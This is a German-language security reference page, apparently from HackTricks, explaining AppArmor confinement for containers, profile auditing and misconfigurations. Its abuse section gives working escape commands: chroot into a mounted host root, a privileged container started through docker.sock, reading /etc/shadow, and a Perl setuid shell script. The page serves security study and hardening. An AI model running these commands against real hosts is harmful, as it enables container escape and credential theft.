# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen über pro-Programm-Profile anwendet. Im Gegensatz zu traditionellen DAC-Prüfungen, die stark von Benutzer- und Gruppenbesitz abhängen, ermöglicht AppArmor dem Kernel, eine dem Prozess selbst zugeordnete Richtlinie durchzusetzen. In Container-Umgebungen ist das wichtig, weil ein Workload genug traditionelle Rechte haben kann, um eine Aktion zu versuchen, aber dennoch abgewiesen wird, weil sein AppArmor-Profil den relevanten Pfad, Mount, Netzwerkverhalten oder die Nutzung einer capability nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Es bewertet den Zugriff auf das Dateisystem über Pfadregeln anstelle von Labels, wie SELinux es tut. Das macht es zugänglich und mächtig, bedeutet aber auch, dass bind mounts und alternative Pfad-Layouts besondere Aufmerksamkeit verdienen. Wenn derselbe Host-Inhalt unter einem anderen Pfad erreichbar wird, kann die Wirkung der Richtlinie anders sein, als der Betreiber ursprünglich erwartet hat.

## Rolle in der Container-Isolierung

Container-Security-Reviews enden oft bei capabilities und seccomp, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stell dir einen Container vor, der mehr Rechte hat als er sollte, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche capability benötigte. AppArmor kann dennoch Datei­zugriffe, Mount-Verhalten, Netzwerkzugriff und Ausführungsmuster einschränken und so den offensichtlichen Missbrauchspfad stoppen. Deshalb kann das Deaktivieren von AppArmor „nur damit die Anwendung läuft“ eine lediglich riskante Konfiguration stillschweigend in eine aktiv ausnutzbare verwandeln.

## Labor

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwende:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Kontext der aktuelle Containerprozess ausgeführt wird:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im normalen Fall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom runtime gewählte Profil gebunden ist. Im unconfined-Fall verschwindet diese zusätzliche Einschränkungsebene.

Sie können auch prüfen, was Docker glaubt angewendet zu haben:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitnutzung

Docker kann ein Standard- oder ein benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann sich auf AppArmor-basierten Systemen ebenfalls in AppArmor integrieren, obwohl auf SELinux-zentrierten Distributionen das andere MAC-System häufig im Vordergrund steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Knoten bereitstellen, die AppArmor tatsächlich unterstützen. LXC und verwandte system-container-Umgebungen der Ubuntu-Familie nutzen AppArmor ebenfalls umfangreich.

Der praktische Punkt ist, dass AppArmor keine "Docker-Funktion" ist. Es ist eine Host-Kernel-Funktion, die mehrere Runtimes optional anwenden können. Wenn der Host sie nicht unterstützt oder die Runtime angewiesen wird, unconfined zu laufen, ist der vermeintliche Schutz de facto nicht vorhanden.

Für Kubernetes konkret ist die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotationen veraltet. Auf unterstützten Hosts ist `RuntimeDefault` das Standardprofil, während `Localhost` auf ein Profil verweist, das bereits auf dem Knoten geladen sein muss. Das ist bei Reviews wichtig, weil ein Manifest AppArmor-unterstützend aussehen kann, während es dennoch vollständig von Knoten-seitiger Unterstützung und vorab geladenen Profilen abhängt.

Ein subtiler, aber nützlicher Betriebsaspekt ist, dass das explizite Setzen von `appArmorProfile.type: RuntimeDefault` strenger ist, als das Feld einfach wegzulassen. Wenn das Feld explizit gesetzt ist und der Knoten AppArmor nicht unterstützt, sollte die admission fehlschlagen. Wird das Feld weggelassen, kann der Workload trotzdem auf einem Knoten ohne AppArmor laufen und erhält einfach nicht diese zusätzliche Schutzschicht. Aus Angreifersicht ist das ein guter Grund, sowohl das Manifest als auch den tatsächlichen Zustand des Knotens zu prüfen.

Auf AppArmor-fähigen Docker-Hosts ist das bekannteste Default-Profil `docker-default`. Dieses Profil wird aus Mobys AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Standard-Container weiterhin fehlschlagen. Grob gesagt erlaubt `docker-default` normales Networking, verbietet Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf empfindliche Bereiche von `/sys`, blockiert mount-Operationen und schränkt ptrace so ein, dass es kein allgemeines Werkzeug zum Abtasten des Hosts ist. Das Verständnis dieser Basislinie hilft zu unterscheiden, "der Container hat `CAP_SYS_ADMIN`" von "der Container kann diese Capability tatsächlich gegen die Kernel-Schnittstellen verwenden, die mich interessieren".

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention besteht darin, Schrägstriche im Pfad der ausführbaren Datei durch Punkte zu ersetzen. Beispielsweise wird ein Profil für `/usr/bin/man` häufig als `/etc/apparmor.d/usr.bin.man` abgelegt. Diese Einzelheit ist sowohl für die Verteidigung als auch für die Bewertung wichtig, denn sobald man den aktiven Profilnamen kennt, kann man die zugehörige Datei auf dem Host oft schnell finden.

Nützliche hostseitige Verwaltungsbefehle sind:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer container-security-Referenz wichtig sind, ist, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in den complain mode geschaltet und nach Änderungen an der Anwendung angepasst werden. Wenn ein Operator die Angewohnheit hat, Profile während der Fehlersuche in den complain mode zu versetzen und zu vergessen, die Durchsetzung wiederherzustellen, kann der Container in der Dokumentation geschützt aussehen, sich in der Realität jedoch deutlich lockerer verhalten.

### Erstellen und Aktualisieren von Profilen

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv beim Generieren eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Template-Profil erzeugen, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn das Binary sich ändert und die Richtlinie aktualisiert werden muss, kann `aa-logprof` die in den Logs gefundenen Denials erneut abspielen und den Operator dabei unterstützen, zu entscheiden, ob sie zugelassen oder abgelehnt werden sollen:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Verweigerungen sind oft über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Das ist operativ und offensiv nützlich. Verteidiger nutzen es, um AppArmor-Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Komponente ist, die eine Exploit-Kette blockiert.

### Identifizierung der exakten Profil-Datei

Wenn eine runtime einen spezifischen AppArmor-Profilnamen für einen container anzeigt, ist es oft hilfreich, diesen Namen auf die Profil-Datei auf der Festplatte zurückzuführen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dies ist besonders nützlich während einer hostseitigen Überprüfung, da es die Lücke zwischen „der Container gibt an, unter dem Profil `lowpriv` zu laufen“ und „die eigentlichen Regeln liegen in dieser konkreten Datei, die geprüft oder neu geladen werden kann“ überbrückt.

### Wichtige Regeln zum Prüfen

Wenn Sie ein Profil lesen können, hören Sie nicht bei einfachen `deny`-Zeilen auf. Mehrere Regeltypen verändern maßgeblich, wie nützlich AppArmor gegen einen Container-Escape-Versuch ist:

- `ux` / `Ux`: führt das Zielbinary ungehindert aus. Wenn ein erreichbarer helper, shell oder interpreter unter `ux` erlaubt ist, ist das normalerweise das erste, was man testet.
- `px` / `Px` und `cx` / `Cx`: führen Profilwechsel bei exec durch. Diese sind nicht automatisch schlecht, aber sie sind prüfenswert, weil ein Wechsel in ein viel weiter gefasstes Profil als das aktuelle führen kann.
- `change_profile`: erlaubt einem Task, in ein anderes geladenes Profil zu wechseln, sofort oder beim nächsten exec. Wenn das Zielprofil schwächer ist, kann dies zum vorgesehenen Ausstiegspfad aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)`, oder neuer `flags=(prompt)`: diese sollten das Vertrauen in das Profil beeinflussen. `complain` protokolliert Verstöße anstatt sie durchzusetzen, `unconfined` entfernt die Grenze, und `prompt` hängt von einem Userspace-Entscheidungsweg ab statt von einem rein vom Kernel erzwungenen `deny`.
- `userns` or `userns create,`: neuere AppArmor-Policy kann die Erstellung von user namespaces vermitteln. Wenn ein Container-Profil dies explizit erlaubt, bleiben verschachtelte user namespaces möglich, selbst wenn die Plattform AppArmor als Teil ihrer Hardening-Strategie nutzt.

Nützliches hostseitiges grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Diese Art von Audit ist oft nützlicher, als hunderte gewöhnliche Dateiregeln anzustarren. Wenn ein breakout davon abhängt, einen helper auszuführen, in einen neuen namespace zu wechseln oder in ein weniger restriktives profile zu entkommen, steckt die Antwort oft in diesen auf Übergänge ausgerichteten Regeln statt in den offensichtlichen `deny /etc/shadow r`-artigen Zeilen.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen ihn häufig beim Debugging einer Anwendung, die fehlgeschlagen ist, weil das profile etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Bleibt das Flag in der Produktion bestehen, ist die gesamte MAC layer effektiv entfernt.

Ein weiteres subtileres Problem ist die Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert ist, kann das Freilegen von Host-Pfaden unter alternativen Mount-Punkten schlecht mit Pfadregeln interagieren. Ein dritter Fehler ist zu vergessen, dass ein profile-Name in einer Konfigurationsdatei wenig aussagt, wenn der Host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor fehlt, können Vorgänge, die zuvor eingeschränkt waren, plötzlich funktionieren: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Teile von procfs oder sysfs, die eigentlich schwerer zu benutzen bleiben sollten, das Ausführen mount-bezogener Aktionen, sofern capabilities/seccomp dies ebenfalls erlauben, oder die Nutzung von Pfaden, die ein profile normalerweise ablehnen würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein capability-basierter breakout-Versuch auf dem Papier „funktionieren sollte“, in der Praxis aber dennoch fehlschlägt. Entfernt man AppArmor, kann derselbe Versuch beginnen zu funktionieren.

Wenn Sie vermuten, dass AppArmor das Haupthindernis für eine path-traversal-, bind-mount- oder mount-based Missbrauchskette ist, besteht der erste Schritt üblicherweise darin, zu vergleichen, was mit und ohne profile zugänglich wird. Zum Beispiel: Wenn ein Host-Pfad innerhalb des Containers gemountet ist, beginnen Sie damit zu prüfen, ob Sie ihn traversieren und lesen können:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem eine gefährliche Capability wie `CAP_SYS_ADMIN` hat, ist einer der praktischsten Tests, ob AppArmor das Blockieren von mount operations oder den Zugriff auf sensible Kernel-Dateisysteme kontrolliert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein Host-Pfad bereits über ein bind mount verfügbar ist, kann der Verlust von AppArmor ein schreibgeschütztes Information-Disclosure-Problem in direkten Zugriff auf Host-Dateien verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Zweck dieser Befehle ist nicht, dass AppArmor allein den breakout erzeugt. Vielmehr ist es so, dass sobald AppArmor entfernt ist, viele filesystem- und mount-based abuse paths sofort testbar werden.

### Vollständiges Beispiel: AppArmor Disabled + Host Root Mounted

Wenn der container bereits das host root unter `/host` bind-mounted hat, kann das Entfernen von AppArmor einen blockierten filesystem abuse path in eine vollständige host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die shell über das host filesystem ausgeführt wird, ist die workload effektiv der container-Grenze entkommen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime Socket

Wenn die eigentliche Barriere AppArmor für den Runtime-Zustand war, kann ein gemounteter socket ausreichen, um einen vollständigen Escape zu ermöglichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Mount-Punkt ab, aber das Endergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die runtime API nicht mehr, und die runtime API kann einen Container starten, der den Host kompromittieren kann.

### Vollständiges Beispiel: Path-Based Bind-Mount Bypass

Da AppArmor pfadbasiert ist, schützt der Schutz von `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn er über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die Auswirkungen hängen davon ab, was genau gemountet ist und ob der alternative Pfad auch andere Kontrollen umgeht, aber dieses Muster ist einer der klarsten Gründe, warum AppArmor zusammen mit dem Mount-Layout und nicht isoliert bewertet werden muss.

### Vollständiges Beispiel: Shebang Bypass

AppArmor-Policy zielt manchmal auf einen Interpreter-Pfad in einer Weise ab, die die Ausführung von script durch shebang handling nicht vollständig berücksichtigt. Ein historisches Beispiel beinhaltete die Verwendung eines script, dessen erste Zeile auf einen eingeschränkten Interpreter zeigt:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Dieses Beispiel ist wichtig als Erinnerung daran, dass die Absicht eines Profils und die tatsächliche Ausführungssemantik auseinanderfallen können. Beim Überprüfen von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Prüfungen

Ziel dieser Prüfungen ist es, drei Fragen schnell zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert die Workload nicht von AppArmor-Einschränkungen.
- Wenn `aa-status` AppArmor als deaktiviert oder nicht geladen anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund, warum ein filesystem- oder mount-basierter Abuse-Pfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Runtime- oder Orchestrator-Konfiguration allein nicht aus.
- Wenn ein vermeintlich gehärtetes Profil `ux`, weitreichende `change_profile`-, `userns`- oder `flags=(complain)`-ähnliche Regeln enthält, kann die praktische Grenze deutlich schwächer sein, als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits erhöhte Privilegien hat, macht das Aktivieren von AppArmor oft den Unterschied zwischen einer kontrollierten Ausnahme und einem deutlich umfassenderen Sicherheitsversagen.

## Standardeinstellungen der Runtime

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig auf AppArmor-fähigen Hosts aktiviert | Verwendet das `docker-default` AppArmor-Profil, sofern nicht überschrieben | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Abhängig vom Host | AppArmor wird über `--security-opt` unterstützt, aber das genaue Standardverhalten hängt vom Host/Runtime ab und ist weniger einheitlich als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, ist der Standard `RuntimeDefault`, er wird jedoch nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O under Kubernetes | Folgt der Unterstützung des Node/Runtime | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; direkte Runtime-Konfiguration kann AppArmor ebenfalls vollständig umgehen |

Für AppArmor ist oft der **Host** die wichtigste Variable, nicht nur die Runtime. Eine Profil-Einstellung im Manifest schafft keine Einschränkung auf einem Node, auf dem AppArmor nicht aktiviert ist.

## Referenzen

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
